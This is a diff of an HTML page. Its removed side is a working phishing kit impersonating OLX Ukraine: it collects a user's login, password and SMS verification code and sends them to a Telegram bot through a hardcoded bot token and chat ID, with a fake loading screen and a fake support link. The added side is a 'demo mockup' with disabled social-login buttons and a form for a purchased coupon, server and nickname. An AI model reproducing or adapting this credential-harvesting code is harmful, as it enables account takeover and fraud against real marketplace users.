@@ -1,23 +1,22 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="uk">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>OLX верифікація облікового запису</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Демонстраційний макет</title>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <style> 
-    
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
     :root {
-      --primary: #3977f6;
-      --primary-dark: #003b3d;
-      --bg-color: #cbd9fb;
-      --text-main: #002f34;
-      --text-muted: #49676a;
-      --error: #b3261e;
+      --blue: #3977f6;
+      --dark: #002f34;
       --input-bg: #f1f2f2;
-      --focus: #00d9d2;
+      --border: #d8dfe0;
+      --green: #00a49b;
+      --error: #d93025;
     }
 
     * {
@@ -25,493 +24,594 @@
     }
 
     body {
-  margin: 0;
-  font-family: "Inter", Arial, sans-serif;
-      background: var(--primary);
-      color: var(--text-main);
+      margin: 0;
+      min-height: 100vh;
+      background: var(--blue);
+      font-family: "Inter", Arial, sans-serif;
+      color: var(--dark);
       display: flex;
       justify-content: center;
-      min-height: 100vh;
+      align-items: flex-start;
+      padding: 3px 0;
     }
-
-    .bg {
-      position: fixed;
-      inset: 0;
-      overflow: hidden;
-      z-index: -1;
-    }
-
-    .bg:before,
-    .bg:after {
-      content: "";
-      position: absolute;
-      width: 360px;
-      height: 360px;
-      background: var(--bg-color);
-      border-radius: 50%;
-      left: -190px;
-    }
-
-    .bg:before { top: -190px; }
-    .bg:after { bottom: -190px; }
 
     .card {
-      width: min(500px, calc(100% - 32px));
-      margin-top: 10vh;
-      margin-bottom: 2rem;
+      width: 480px;
+      max-width: calc(100% - 32px);
       background: #fff;
-      border-radius: 12px;
-      padding: 40px;
-      box-shadow: 0 15px 45px rgba(0, 0, 0, 0.12);
-      height: fit-content;
-      position: relative;
+      border-radius: 5px;
+      padding: 27px 38px 34px;
+      min-height: 850px;
     }
 
-    /* Анімація перемикання екранів */
-    section {
-      animation: fadeIn 0.4s ease-out forwards;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .back-btn {
-      background: none;
-      border: none;
-      padding: 0;
-      cursor: pointer;
-      margin-bottom: 30px;
+    .social-btn {
+      width: 100%;
+      height: 61px;
+      border: 2px solid var(--dark);
+      border-radius: 5px;
+      background: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      transition: background 0.2s;
-    }
-
-    .back-btn:hover {
-      background: var(--input-bg);
-    }
-
-    .back-btn svg {
-      width: 24px;
-      height: 24px;
-      fill: var(--text-main);
-    }
-
-    .logo {
-      font-weight: 800;
-      font-size: 38px;
-      margin-bottom: 24px;
-      color: var(--primary);
-    }
-
-    h1 {
-  font-size: 32px;
-  line-height: 1.2;
-  margin: 0 0 16px;
-  font-weight: 700;
-  letter-spacing: -0.8px;
-}
-
-    p {
+      gap: 13px;
+      margin-bottom: 19px;
+      font-family: inherit;
       font-size: 18px;
-      line-height: 1.5;
-      margin: 0 0 24px;
-      color: var(--text-muted);
+      font-weight: 700;
+      color: var(--dark);
+      cursor: default;
+    }
+
+    .social-btn:disabled {
+      opacity: 1;
+    }
+
+    .social-btn svg {
+      width: 30px;
+      height: 30px;
+      flex-shrink: 0;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      margin: 24px 0 26px;
+      font-size: 16px;
+      font-weight: 700;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      height: 2px;
+      background: #8ba0a2;
+      flex: 1;
+    }
+
+    .field {
+      margin-bottom: 27px;
     }
 
     label {
       display: block;
-      font-size: 15px;
-      font-weight: 600;
-      margin-bottom: 8px;
+      font-size: 16px;
+      margin-bottom: 9px;
     }
 
     input {
       width: 100%;
       height: 56px;
       border: 2px solid transparent;
-      border-radius: 8px;
+      border-radius: 5px;
       background: var(--input-bg);
-      padding: 0 18px;
-      font-size: 18px;
+      padding: 0 14px;
+      font-family: inherit;
+      font-size: 17px;
       outline: none;
-      transition: all 0.2s ease;
     }
 
     input:focus {
-      border-color: var(--focus);
-      background: #fff;
-      box-shadow: 0 4px 12px rgba(0, 217, 210, 0.15);
-    }
-
-    input.input-error {
-      border-color: var(--error);
+      border-color: var(--green);
       background: #fff;
     }
 
-    .btn {
+    .login-btn {
       width: 100%;
-      height: 56px;
+      height: 57px;
+      margin-top: 21px;
       border: 0;
-      border-radius: 8px;
-      background: var(--primary-dark);
-      color: #fff;
-      font-weight: 700;
+      border-radius: 5px;
+      background: #d8dfe0;
+      color: #8ba0a2;
+      font-family: inherit;
       font-size: 18px;
-      margin-top: 24px;
+      font-weight: 700;
       cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
+      transition: 0.15s ease;
     }
 
-    .btn:hover {
-      background: #002425;
+    .login-btn.active {
+      background: var(--green);
+      color: #fff;
     }
 
-    .btn:active {
-      transform: scale(0.98);
+    .login-btn:disabled {
+      cursor: default;
+      opacity: 1;
     }
 
-    .btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
+    .terms {
+      text-align: center;
+      font-size: 13px;
+      line-height: 1.45;
+      margin-top: 36px;
     }
 
-    .hidden {
-      display: none !important;
+    .terms strong {
+      font-weight: 800;
+    }
+
+    /* =========================
+       ЭКРАН ПОДТВЕРЖДЕНИЯ
+       ========================= */
+
+    .confirmation {
+      display: none;
+    }
+
+    .confirmation.active {
+      display: block;
+    }
+
+    .main-form.hidden {
+      display: none;
+    }
+
+    .confirm-title {
+      font-size: 25px;
+      font-weight: 800;
+      text-align: center;
+      margin: 15px 0 12px;
+    }
+
+    .confirm-text {
+      text-align: center;
+      font-size: 15px;
+      line-height: 1.5;
+      margin: 0 0 30px;
+    }
+
+    .request-box {
+      background: var(--input-bg);
+      border-radius: 5px;
+      padding: 16px;
+      margin-bottom: 27px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .request-box strong {
+      font-weight: 700;
+    }
+
+    .success {
+      display: none;
+      text-align: center;
+    }
+
+    .success.active {
+      display: block;
+    }
+
+    .success-icon {
+      width: 65px;
+      height: 65px;
+      margin: 20px auto;
+      border-radius: 50%;
+      background: var(--green);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 34px;
+      font-weight: 700;
+    }
+
+    .success-title {
+      font-size: 24px;
+      font-weight: 800;
+      margin-bottom: 12px;
+    }
+
+    .success-text {
+      font-size: 15px;
+      line-height: 1.5;
     }
 
     .error {
+      display: none;
       color: var(--error);
       font-size: 14px;
-      margin-top: 8px;
-      display: none;
-      font-weight: 500;
-    }
-
-    .birthdate {
-      letter-spacing: 6px;
       text-align: center;
-      font-size: 26px;
-      font-variant-numeric: tabular-nums;
+      margin-top: 15px;
+      line-height: 1.4;
     }
 
-    .note {
-      font-size: 14px;
-      color: var(--text-muted);
-      margin-top: 16px;
-      text-align: center;
+    .error.active {
+      display: block;
     }
 
-    /* Loading state */
     .loading {
-      text-align: center;
-      padding: 30px 0 10px;
+      pointer-events: none;
+      opacity: 0.65;
     }
 
-    .spinner {
-      width: 60px;
-      height: 60px;
-      margin: 0 auto 24px;
-      border: 4px solid var(--input-bg);
-      border-top-color: var(--primary);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    .loading-title {
-      font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-
-    .loading-text {
-      font-size: 16px;
-      color: var(--text-muted);
-    }
-
-    .progress {
-      width: 100%;
-      height: 6px;
-      background: var(--input-bg);
-      border-radius: 10px;
-      margin-top: 30px;
-      overflow: hidden;
-    }
-
-    .progress-bar {
-      height: 100%;
-      width: 0;
-      background: var(--primary);
-      border-radius: 10px;
-      animation: progress 5s linear forwards;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    @keyframes progress {
-      from { width: 0; }
-      to { width: 100%; }
-    }
-
-    /* Адаптив */
     @media (max-width: 600px) {
-      .card {
-        margin-top: 0;
-        border-radius: 0;
-        min-height: 100vh;
-        width: 100%;
-        padding: 30px 20px;
+      body {
+        padding: 0;
       }
-      h1 { font-size: 30px; }
-      .logo { font-size: 32px; }
+
+      .card {
+        width: 100%;
+        max-width: 100%;
+        min-height: 100vh;
+        border-radius: 0;
+        padding: 25px 20px;
+      }
+
+      .social-btn {
+        font-size: 16px;
+      }
     }
-    .support-btn {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  text-decoration: none;
-}
   </style>
 </head>
 
 <body>
-  <div class="bg"></div>
 
   <main class="card">
-    <button class="back-btn hidden" id="backBtn" onclick="goBack()" aria-label="Повернутися назад">
-      <svg viewBox="0 0 24 24">
-        <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
-      </svg>
-    </button>
 
-    <!-- STEP 1 -->
-    <section id="step1">
-      <div class="logo">OLX UA</div>
-      <h1>Введіть ваш логiн:</h1>
-      <p>Підтвердження облікового запису OLX</p>
+    <!-- =========================
+         ПЕРВЫЙ ЭКРАН
+         ========================= -->
 
-      <label for="name">номер телефону або електронна пошта</label>
-      <input 
-        id="name" 
-        autocomplete="name" 
-        placeholder="Логiн" 
-        maxlength="100"
-        onkeydown="handleEnter(event, goLogin)"
-      >
-      <div id="nameError" class="error">Введіть логiн:</div>
+    <div class="main-form" id="mainForm">
 
-      <button class="btn" onclick="goLogin()">Продовжити</button>
-    </section>
+      <!-- Facebook -->
+      <button class="social-btn" type="button" disabled>
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="11" fill="#1877F2"/>
+          <path fill="#fff" d="M13.5 21v-8h2.7l.4-3h-3.1V8.1c0-.9.3-1.5 1.6-1.5h1.7V4c-.3 0-1.3-.1-2.5-.1-2.5 0-4.2 1.5-4.2 4.3V10H7.4v3h2.7v8h3.4z"/>
+        </svg>
+        Продовжити через Facebook
+      </button>
 
-    <!-- STEP 2 -->
-    <section id="step2" class="hidden">
-      <div class="logo">OLX</div>
-      <h1>Введіть пароль</h1>
+      <!-- Apple -->
+      <button class="social-btn" type="button" disabled>
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="#000" d="M17.05 12.54c-.02-2.1 1.72-3.12 1.8-3.17a3.88 3.88 0 0 0-3.05-1.65c-1.3-.14-2.54.78-3.2.78-.67 0-1.7-.76-2.8-.74a4.13 4.13 0 0 0-3.47 2.12c-1.5 2.6-.38 6.44 1.08 8.55.73 1.03 1.56 2.18 2.68 2.14 1.08-.04 1.49-.69 2.8-.69 1.3 0 1.67.69 2.8.67 1.16-.02 1.9-1.04 2.61-2.08a8.5 8.5 0 0 0 1.2-2.4 3.72 3.72 0 0 1-2.45-3.53zM14.96 6.36A3.7 3.7 0 0 0 15.8 3a3.8 3.8 0 0 0-2.76 1.43 3.56 3.56 0 0 0-.86 2.86 3.13 3.13 0 0 0 2.78-.93z"/>
+        </svg>
+        Продовжити через Apple
+      </button>
 
-      <label for="login">Пароль</label>
-      <input 
-        id="login" 
-        autocomplete="username" 
-        placeholder="Пароль" 
-        maxlength="50"
-        onkeydown="handleEnter(event, submitRegistration)"
-      >
-      <div id="loginError" class="error">Введіть пароль.</div>
+      <!-- Google -->
+      <button class="social-btn" type="button" disabled>
+        <svg viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.55-.2-2.27H12v4.3h6.45a5.5 5.5 0 0 1-2.4 3.61v3h3.88c2.27-2.09 3.56-5.17 3.56-8.64z"/>
+          <path fill="#34A853" d="M12 24c3.24 0 5.95-1.07 7.93-2.9l-3.88-3c-1.07.72-2.43 1.15-4.05 1.15-3.12 0-5.77-2.11-6.72-4.95H1.27v3.09A12 12 0 0 0 12 24z"/>
+          <path fill="#FBBC05" d="M5.28 14.3A7.2 7.2 0 0 1 4.9 12c0-.8.14-1.57.38-2.3V6.61H1.27A12 12 0 0 0 0 12c0 1.94.46 3.78 1.27 5.39l4.01-3.09z"/>
+          <path fill="#EA4335" d="M12 4.75c1.76 0 3.34.61 4.59 1.81l3.44-3.44C17.94 1.12 15.24 0 12 0A12 12 0 0 0 1.27 6.61l4.01 3.09C6.23 6.86 8.88 4.75 12 4.75z"/>
+        </svg>
+        Продовжити через Google
+      </button>
 
-      <button id="continueButton" class="btn" onclick="submitRegistration()">Продовжити</button>
-    </section>
-
-    <!-- LOADING -->
-    <section id="loading" class="hidden">
-      <div class="logo">OLX</div>
-      <div class="loading">
-        <div class="spinner"></div>
-        <div class="loading-title">Перевіряємо дані...</div>
-        <div class="loading-text">Будь ласка, зачекайте кілька хвилин.</div>
-        <div class="progress">
-          <div class="progress-bar"></div>
-        </div>
+      <div class="divider">
+        <span>чи</span>
       </div>
-    </section>
 
-    <!-- STEP 3 -->
-    <section id="step3" class="hidden">
-      <div class="logo">OLX</div>
-      <h1>Це точно ви?</h1>
-      <p>Ми відправили вам SMS з кодом підтвердження, ми повинні переконатися що це саме ви, перевірте Viber / SMS / електронну пошту</p>
+      <form id="couponForm">
 
-      <label for="birthdate">Введіть код підтвердження</label>
-      <input 
-        id="birthdate" 
-        class="birthdate" 
-        inputmode="numeric" 
-        autocomplete="bday" 
-        maxlength="6" 
-        placeholder="Введіть код"
-        oninput="digitsOnly(this)"
-        onkeydown="handleEnter(event, finish)"
-      >
-      <div id="birthdateError" class="error">Спробуйте ще раз!</div>
+        <div class="field">
+          <label for="coupon">Ваш купленный купон</label>
 
-      <button class="btn" onclick="finish()">Підтвердити</button>
-      <div class="note">OLX.UA 2026</div>
-    </section>
+          <input
+            type="text"
+            id="coupon"
+            autocomplete="off"
+          >
+        </div>
 
-    <!-- DONE -->
-    <section id="done" class="hidden">
-      <div class="logo">OLX</div>
-      <h1>Помилка!</h1>
-      <p>Дані або код були введені неправильно, спробуйте ще раз або зверніться до служби підтримки!</p>
-      <a href="https://t.me/olx_bezpeka" class="btn support-btn" target="_blank">Служба підтримки</a>
-    </section>
+        <div class="field">
+          <label for="server">Сервер введиите текстом</label>
+
+          <input
+            type="text"
+            id="server"
+            autocomplete="off"
+          >
+        </div>
+
+        <button
+          class="login-btn"
+          id="submitBtn"
+          type="submit"
+          disabled
+        >
+          Отправить
+        </button>
+
+        <div class="error" id="mainError"></div>
+
+      </form>
+
+      <div class="terms">
+        Під час отправки ви погоджуєтеся з нашими
+        <strong>Умови<br>користування.</strong>
+      </div>
+
+    </div>
+
+
+    <!-- =========================
+         ПОДТВЕРЖДЕНИЕ НИКА
+         ========================= -->
+
+    <div class="confirmation" id="confirmation">
+
+      <div class="confirm-title">
+        Это действительно Вы?
+      </div>
+
+      <div class="confirm-text">
+        Для подтверждения заявки укажите ваш ник
+        на сервере.
+      </div>
+
+      <div class="request-box">
+        <strong>ID заявки:</strong>
+        <span id="requestIdText"></span>
+      </div>
+
+      <form id="nicknameForm">
+
+        <div class="field">
+          <label for="nickname">Ваш ник</label>
+
+          <input
+            type="text"
+            id="nickname"
+            autocomplete="off"
+            maxlength="100"
+          >
+        </div>
+
+        <button
+          class="login-btn"
+          id="confirmBtn"
+          type="submit"
+          disabled
+        >
+          Подтвердить
+        </button>
+
+        <div class="error" id="confirmError"></div>
+
+      </form>
+
+    </div>
+
+
+    <!-- =========================
+         УСПЕШНО
+         ========================= -->
+
+    <div class="success" id="success">
+
+      <div class="success-icon">
+        ✓
+      </div>
+
+      <div class="success-title">
+        Готово!
+      </div>
+
+      <div class="success-text">
+        Ваша заявка подтверждена.<br>
+        ID заявки:
+        <strong id="successRequestId"></strong>
+      </div>
+
+    </div>
+
   </main>
 
-  <script>
-    // ⚠️ УВАГА: В реальних проектах токен бота та ID чату НЕ МОЖНА зберігати в HTML файлі!
-    // Їх можуть вкрасти. Це має працювати через ваш власний бекенд (PHP, Node.js, Python тощо).
-    const TELEGRAM_BOT_TOKEN = "8671990790:AAFJ9HAc4SWswxBNKYgIJdqiO6xlI1YRqzw";
-    const TELEGRAM_CHAT_ID = "-1003571283881";
 
-    const requestId = "MS-" + crypto.randomUUID().replaceAll("-", "").substring(0, 8).toUpperCase();
-    const sections = ["step1", "step2", "loading", "step3", "done"];
+<script>
 
-    function $(id) {
-      return document.getElementById(id);
+  const couponInput = document.getElementById("coupon");
+  const serverInput = document.getElementById("server");
+  const submitBtn = document.getElementById("submitBtn");
+
+  const nicknameInput = document.getElementById("nickname");
+  const confirmBtn = document.getElementById("confirmBtn");
+
+  const couponForm = document.getElementById("couponForm");
+  const nicknameForm = document.getElementById("nicknameForm");
+
+  const mainForm = document.getElementById("mainForm");
+  const confirmation = document.getElementById("confirmation");
+  const success = document.getElementById("success");
+
+  const mainError = document.getElementById("mainError");
+  const confirmError = document.getElementById("confirmError");
+
+  const requestIdText = document.getElementById("requestIdText");
+  const successRequestId = document.getElementById("successRequestId");
+
+  let currentRequestId = null;
+
+
+  // =========================
+  // АКТИВАЦИЯ КНОПКИ
+  // =========================
+
+  function updateSubmitButton() {
+
+    const coupon = couponInput.value.trim();
+    const server = serverInput.value.trim();
+
+    if (coupon && server) {
+      submitBtn.disabled = false;
+      submitBtn.classList.add("active");
+    } else {
+      submitBtn.disabled = true;
+      submitBtn.classList.remove("active");
+    }
+  }
+
+
+  function updateConfirmButton() {
+
+    const nickname = nicknameInput.value.trim();
+
+    if (nickname) {
+      confirmBtn.disabled = false;
+      confirmBtn.classList.add("active");
+    } else {
+      confirmBtn.disabled = true;
+      confirmBtn.classList.remove("active");
+    }
+  }
+
+
+  couponInput.addEventListener("input", updateSubmitButton);
+  serverInput.addEventListener("input", updateSubmitButton);
+  nicknameInput.addEventListener("input", updateConfirmButton);
+
+
+  // =========================
+  // ПЕРВАЯ ОТПРАВКА
+  // =========================
+
+  couponForm.addEventListener("submit", async function(event) {
+
+    event.preventDefault();
+
+    mainError.classList.remove("active");
+
+    const coupon = couponInput.value.trim();
+    const server = serverInput.value.trim();
+
+    if (!coupon || !server) {
+      return;
     }
 
-    // Обробка натискання Enter
-    function handleEnter(event, actionFunc) {
-      if (event.key === 'Enter') {
-        event.preventDefault();
-        actionFunc();
-      }
-    }
+    submitBtn.disabled = true;
+    submitBtn.classList.remove("active");
+    submitBtn.textContent = "Отправка...";
 
-    function updateBackButtonVisibility(currentId) {
-      const backBtn = $("backBtn");
-      if (currentId === "step1" || currentId === "loading" || currentId === "done") {
-        backBtn.classList.add("hidden");
-      } else {
-        backBtn.classList.remove("hidden");
-      }
-    }
+    try {
 
-    function show(id) {
-      sections.forEach(section => {
-        $(section).classList.add("hidden");
+      const response = await fetch("/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          coupon: coupon,
+          server: server
+        })
       });
-      $(id).classList.remove("hidden");
-      updateBackButtonVisibility(id);
-      
-      // Фокус на інпут при переході на новий екран
-      const input = $(id).querySelector('input');
-      if(input) setTimeout(() => input.focus(), 100);
-    }
 
-    function goBack() {
-      const current = sections.findIndex(id => !$(id).classList.contains("hidden"));
-      if (current > 0) {
-        show(sections[current - 1]);
-      }
-    }
+      const data = await response.json();
 
-    function showError(inputId, errorId, show) {
-      $(errorId).style.display = show ? "block" : "none";
-      if (show) {
-        $(inputId).classList.add("input-error");
-      } else {
-        $(inputId).classList.remove("input-error");
-      }
-    }
-
-    function goLogin() {
-      const name = $("name").value.trim();
-      if (!name) {
-        showError("name", "nameError", true);
-        return;
-      }
-      showError("name", "nameError", false);
-      show("step2");
-    }
-
-    async function sendTelegram(text) {
-      if (TELEGRAM_BOT_TOKEN === "PASTE_NEW_BOT_TOKEN_HERE") {
-        console.warn("Telegram Bot Token не вказано.");
-        return false;
+      if (!response.ok || !data.success) {
+        throw new Error(
+          data.error || "Произошла ошибка."
+        );
       }
 
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: text,
-            parse_mode: "HTML"
-          })
-        });
-        const result = await response.json();
-        return result.ok === true;
-      } catch (error) {
-        console.error("Telegram error:", error);
-        return false;
+      currentRequestId = data.request_id;
+
+      requestIdText.textContent = currentRequestId;
+
+      mainForm.classList.add("hidden");
+      confirmation.classList.add("active");
+
+      nicknameInput.focus();
+
+    } catch (error) {
+
+      mainError.textContent = error.message;
+      mainError.classList.add("active");
+
+      submitBtn.disabled = false;
+      submitBtn.classList.add("active");
+      submitBtn.textContent = "Отправить";
+    }
+
+  });
+
+
+  // =========================
+  // ПОДТВЕРЖДЕНИЕ НИКА
+  // =========================
+
+  nicknameForm.addEventListener("submit", async function(event) {
+
+    event.preventDefault();
+
+    confirmError.classList.remove("active");
+
+    const nickname = nicknameInput.value.trim();
+
+    if (!nickname || !currentRequestId) {
+      return;
+    }
+
+    confirmBtn.disabled = true;
+    confirmBtn.classList.remove("active");
+    confirmBtn.textContent = "Проверка...";
+
+    try {
+
+      const response = await fetch("/confirm", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          request_id: currentRequestId,
+          nickname: nickname
+        })
+      });
+
+      const data = await response.json();
+
+      if (!response.ok || !data.success) {
+        throw new Error(
+          data.error || "Произошла ошибка."
+        );
       }
+
+      successRequestId.textContent = currentRequestId;
+
+      confirmation.classList.remove("active");
+      success.classList.add("active");
+
+    } catch (error) {
+
+      confirmError.textContent = error.message;
+      confirmError.classList.add("active");
+
+      confirmBtn.disabled = false;
+      confirmBtn.classList.add("active");
+      confirmBtn.textContent = "Подтвердить";
     }
 
-    async function submitRegistration() {
-      const name = $("name").value.trim();
-      const login = $("login").value.trim();
+  });
 
-      if (!login) {
-        showError("login", "loginError", true);
-        return;
-      }
-      showError("login", "loginError", false);
+</script>
 
-      const text = `🆕 <b>НОВАЯ ЗАЯВКА OLX</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Логин: <code>${name}</code>\n🔑 Пароль: <code>${login}</code>`;
-      sendTelegram(text); // Відправляємо без await, щоб не затримувати UI
-
-      show("loading");
-
-      // Чекаємо 5 секунд
-      await new Promise(resolve => setTimeout(resolve, 5000));
-      show("step3");
-    }
-
-    function digitsOnly(input) {
-      input.value = input.value.replace(/\D/g, "").substring(0, 6);
-      showError("birthdate", "birthdateError", false);
-    }
-
-    function isValidBirthdate(value) {
-      if (!/^\d{6}$/.test(value)) return false;
-      return true; // 👈 ОСТАВИТЬ ТОЛЬКО ЭТО
-    }
-
-    async function finish() {
-      const birthdate = $("birthdate").value.trim();
-
-      if (!isValidBirthdate(birthdate)) {
-        showError("birthdate", "birthdateError", true);
-        return;
-      }
-      showError("birthdate", "birthdateError", false);
-
-      const name = $("name").value.trim();
-      const login = $("login").value.trim();
-
-      const text = `✅ <b>ДАННЫЕ ЗАЯВКИ olx</b>\n\n🆔 ID: <code>${requestId}</code>\n👤 Логин: <b>${name}</b>\n🔑 Пароль: <b>${login}</b>\n🎂 КОД: <code>${birthdate}</code>`;
-      
-      sendTelegram(text);
-      show("done");
-    }
-  </script>
 </body>
 </html>
